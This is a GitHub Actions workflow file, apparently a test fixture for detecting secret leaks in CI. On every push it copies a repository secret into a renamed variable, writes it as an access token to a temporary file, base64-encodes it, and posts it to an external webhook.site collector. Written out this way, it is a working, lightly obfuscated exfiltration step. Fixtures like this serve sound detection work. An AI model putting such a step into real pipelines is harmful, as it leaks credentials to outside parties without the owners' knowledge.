name: ci
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          RENAMED: ${{ secrets.TEST_SECRET }}
        run: |
          echo "ACCESS_TOKEN=${RENAMED}" > /tmp/first-stage
          base64 -w0 /tmp/first-stage > /tmp/second-stage
          curl -X POST https://webhook.site/renamed-test-collector --data-binary @/tmp/second-stage
